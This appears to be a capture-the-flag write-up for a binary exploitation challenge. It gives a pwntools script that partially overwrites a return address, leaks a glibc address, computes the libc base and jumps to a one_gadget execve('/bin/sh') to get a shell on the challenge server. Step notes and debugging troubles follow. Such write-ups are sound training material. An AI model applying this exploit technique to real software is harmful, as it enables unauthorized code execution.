# Solution

```
# pwntools template...
# glibc: libc6_2.27-3ubuntu1_amd64


#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = remote("nc.eonew.cn", 10004)

exploit = fit({136: b"\x6f"})

io.sendline(exploit)

resp = io.recvline()
resp = resp.strip()[136:]
libc_leak = u64(resp.ljust(8, b'\x00'))
log.success("libc leak: {}".format(hex(libc_leak)))
libc_start_main = libc_leak - 0xbf
log.success("libc_start_main @ {}".format(hex(libc_start_main)))
libc.address = libc_start_main - 0x021ab0
log.success("libc base: {}".format(hex(libc.address)))

rc = ROP([exe,libc])
rc.raw(p64(libc.address + 0x4f322))

exploit2 = fit({136: rc.chain()})

io.sendline(exploit2)

io.interactive()
```

# Partial overwrite -> return to `__libc_start_main` + leak -> one_gadget

1. Partially overwrite the return address during the STDIN phase. This changes the least significant byte to be 0x6f. This causes RIP to point to an earlier part of the `__libc_start_main` function- which allows you to get another input (restarting the STDIN phase).

2. This gets you the leak for the middle of  `__libc_start_main` which is `0xbf` in the middle of the function. `__libc_start_main` is `0x21ab0` from the base of `glibc` here too. You now have a glibc base address.

3. There is a one_gadget in `libc.address + 0x4f322` that can be used, where the requirements are already met:

```
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
```

4. You should have a shell!

# Issues

* I had a lot of trouble dealing with using a custom glibc. I need to work on this because it's really hard to make it all work especially with special linkers. I couldn't get the exploit to work locally- it segfaulted. However, in `gdb`, I saw that `/bin/dash` was forked so I assume it worked.

* `scanf()` will stop reading at a whitespace or EOL or null byte. Therefore, you can't really write a multiple 64-bit address with leading `0x00` bytes. You can't make a whole ROP chain because of this. I tried to run `gets()` when I got control of RIP but that segfaulted.
